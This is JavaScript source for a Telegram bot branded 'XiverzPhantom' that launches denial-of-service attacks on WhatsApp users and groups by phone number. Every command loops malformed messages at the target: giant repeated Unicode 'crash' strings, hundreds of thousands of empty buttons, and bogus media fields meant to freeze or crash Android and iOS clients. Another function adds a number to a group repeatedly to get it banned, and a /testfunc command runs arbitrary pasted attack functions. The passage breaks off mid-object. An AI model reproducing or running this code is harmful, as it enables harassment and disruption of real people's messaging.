<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xlite
✧ Status: Process
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

     for (let i = 0; i < 100; i++) {
         await XvZBlank(sock, target);
         await XvZBlankV1(sock, target);
         await XvZBlankV2(sock, target);
         await XvZBlankV3(sock, target);
         await sleep(3500);
         }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xlite
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xburn", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xburn 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xburn
✧ Status: Process
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;
  
  for (let i = 0; i < 60; i++) {
    await XvZiOS(sock, target);
    await XvZiOSV1(sock, target);
    await XvZiOSV2(sock, target);
    await XvZiOSV3(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xburn
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

//=================== [ CASE BVG GB ] ===================//

bot.command("xslash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xslash 12×××@g.us`);
  let target = q.replace(/[^0-9]/g, '') + "@g.us";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xslash
✧ Status: Process
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await XvZGb(sock, target);
    await XvZGbV1(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xslash
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xban", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xban 12×××@g.us`);
  let target = q.replace(/[^0-9]/g, '') + "@g.us";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xban
✧ Status: Process
✧ Author : @AlipzzyOfficiaL</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await XvZBanGb(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
✧ Target: ${q}
✧ Type: xban
✧ Status: Success</strong></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("testfunc", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunc 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: videoUrl },
        {
          caption: `<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process</strong></blockqoute>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success</strong></blockqoute>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: videoUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

// Group Function
async function XvZGb(sock, target) {
    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "XiverzPhantom¿!"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(target, LexzyExe, {});

    await sock.relayMessage(target, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    await sock.relayMessage(target, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(75000),
            publisher: "XiverzPhantom¿!" + "ꦾ".repeat(5000),
            stickers: [],
            fileLength: "366299919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: ["13135555555@s.whatsapp.net"]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 999999999,
            thumbnailWidth: 9999999999,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "9990099",
            stickerPackOrigin: "USER_CREATED"
        }
    }, {});

    await sock.relayMessage(
        target,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "XiverzPhantom",
                            locationMessage: {
                                degreesLatitude: -999.03499999999999,
                                degreesLongitude: 922.9999999999999,
                                name: "XiverzPhantom",
                                address: "X",
                                jpegThumbnail: null,
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: "XiverzPhantom¿!",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "address_message",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: "ြ ".repeat(75000),
                                },
                            ],
                            messageParamsJson: "wa.me/stickerpack/XiverzPhantomTeam",
                            messageVersion: 1,
                        },
                    },
                },
            },
        },
        {}
    );

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    caption: "XvZTeam¿!",
                    fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                    fileLength: "1099511627776",
                    seconds: 172800,
                    mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                    height: 1080,
                    width: 1920,
                    fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                    directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774428565",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgQVFT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                    annotations: [
                        {
                            polygonVertices: [
                                {
                                    x: 0.17499999701976776,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.6620468497276306
                                },
                                {
                                    x: 0.17499999701976776,
                                    y: 0.6620468497276306
                                }
                            ],
                            shouldSkipConfirmation: true,
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "2261401457948346",
                                    songId: "849859527815275",
                                    author: "XiverzPhantom¿!" + "ြ".repeat(9000),
                                    title: "ြ".repeat(75000),
                                    artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                    artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                    artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                    artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                    artistAttribution: "https://www.instagram.com/_u/alpzzy",
                                    countryBlocklist: "WEs=",
                                    isExplicit: false
                                }
                            },
                            embeddedAction: true
                        }
                    ]
                }
            }
        }
    }, {});

    const bot = "867051314767696@bot";

    await sock.relayMessage(target, {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,

                    submessages: [
                        {
                            messageType: 2,
                            messageText: `@${bot.split("@")[0]}`
                        },

                        {
                            messageType: 5,
                            codeMetadata: {
                                codeLanguage: "javascript",

                                codeBlocks: [
                                    {
                                        highlightType: 1,
                                        codeContent: "const = {"
                                    },
                                    {
                                        highlightType: 2,
                                        codeContent: "XiverzPhantom¿!"
                                    },
                                    {
                                        highlightType: 3,
                                        codeContent: `${"\0".repeat(75000)}` + `${"\x10".repeat(25000)}`
                                    }
                                ]
                            }
                        }
                    ],

                    contextInfo: {
                        mentionedJid: [bot],

                        featureEligibilities: Array.from(
                            { length: 1999 },
                            () => ({
                                canReceiveMultiReact: true
                            })
                        ),

                        isForwarded: true,

                        forwardedAiBotMessageInfo: {
                            botJid: bot
                        },

                        forwardOrigin: 4
                    }
                }
            }
        }
    }, {});

    const Iniochamy = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "LexzyMods - Executed¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999987899999999999999,
                                998999999999999999999,
                                999899999999999999999,
                                9998789999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "XiverzPhantom¿!",
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 450000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Iniochamyy = generateWAMessageFromContent(target, Iniochamy, {});

    await sock.relayMessage(target, Iniochamyy.message, {
        participant: target,
        messageId: Iniochamyy.key.id
    });
}
async function XvZGbV1(sock, groupJid) {
  const XTotS = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "XvZTeam¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "XvZTeam ¡!"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const XXZtS = generateWAMessageFromContent(groupJid, XTotS, {});

await sock.relayMessage(groupJid, XXZtS.message, {
messageId: XXZtS.key.id
})

const adxxyi = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
title: "Nando Officiall",
hasMediaAttachment: true,
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
fileLength: 999999999,
pageCount: 1000,
mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
fileName: "nando.pdf",
fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
mediaKeyTimestamp: "1779839963",
thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
jpegThumbnail: null,
contextInfo: {},
thumbnailHeight: 999,
thumbnailWidth: 999
}
},
body: {
text: "XvZTeam¡!",
},
nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const iVeKXl = generateWAMessageFromContent(groupJid, adxxyi, {});

await sock.relayMessage(groupJid, iVeKXl.message, {
messageId: iVeKXl.key.id
})
}
async function XvZBanGb(sock, groupJid) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {

  if (!groupJid.endsWith('@g.us')) {
    throw new Error('@g.us server required');
  }

  let group = groupJid;

  try {
    await sock.groupParticipantsUpdate(
      group,
      ['18188880008@s.whatsapp.net'],
      'add',
    );

    await sock.sendPresenceUpdate('composing', group);
  } catch (err) {
    console.error('error:', err);
    throw err;
  }
}
}
async function XvZiOS(sock, target) {
  const iOS_Invisible_Freeze = "\x10" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000);
  const iOS_Unicode_Crash = "؂ن؃؄ٽ؂ن؃".repeat(10000);
  const complex_char = "𑇂𑆵𑆴𑆿".repeat(75000);

  const carouselIOS = {
    carouselMessage: {
      cards: Array.from({ length: 1950 }, () => ({
        cardHeader: {
          title: iOS_Invisible_Freeze,
          subtitle: "Apple_System_Kill",
          thumbnail: Buffer.alloc(0)
        },
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: JSON.stringify({ action: "x", data: iOS_Unicode_Crash })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({ display_text: "☠️", url: "https://", merchant_url: "https://" })
          }
        ]
      }))
    }
  };

  const iosListMsg = {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "iOS_STROM" + complex_char,
          listType: 4,
          buttonText: { displayText: "Click for 🩸" },
          singleSelectReply: { selectedRowId: "crash" },
          contextInfo: {
            stanzaId: target,
            participant: target,
            quotedMessage: {
              adminInviteMessage: {
                groupJid: "12345@g.us",
                inviteCode: iOS_Unicode_Crash,
                inviteExpiration: 0,
                groupName: complex_char,
                caption: iOS_Invisible_Freeze
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "XvZTeam" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "XvZTean" + "؂ن؃؄ٽ؂ن؃".repeat(9000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "woi",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "XiverzPhantom",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "pp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: true,
            emojis: ["💥"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: true,
            emojis: ["💥"],
            accessibilityLabel: "BOKEH",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: true,
            emojis: ["💥"],
            accessibilityLabel: "BOKEH",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "BOKEH",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
              creatorName: "Bot"
            }
          }
        },
        packDescription: "./XvZTeam" + "؂ن؃؄ٽ؂ن؃".repeat(75000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 9999,
        thumbnailWidth: 9999,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
      requestPhoneNumberMessage: {
        skipType: "XvZTeam",
        contextInfo: {
          remoteJid: "status@broadcast",
          externalAdReply: {
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            body: "𑇂𑆵𑆴𑆿".repeat(15000),
            mediaType: "DOCUMENT",
            renderLargerThumbnail: true,
            containsAutoReply: true,
            showAdAttribution: true,
            thumbnailUrl: "https://files.catbox.moe/mqdxsm.jpg",
            sourceUrl: `https://${"𑇂𑆵𑆴𑆿".repeat(15000)}.wa.me/settings/linked_devices/#XvZTeam•¿🎭?•(Xvz-iOS),,〽️/`,
          },
          quotedMessage: {
            conversation: "#XvZTeam•¿🎭?•(XvZ-iOS)" + "𑇂𑆵𑆴𑆿".repeat(15000)
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135559999@s.whatsapp.net",
            businessDescrbiption: " # XvZ - Team 〽️🎭 ",
          },
          mentionedJid: ["0@s.whatsapp.net"],
          forwardedNewsletterMessageInfo: {
            newsletterJid: "666-666@g.us",
            serverMessageId: 1,
            newsletterName: "؂ن؃؄ٽ؂ن؃",
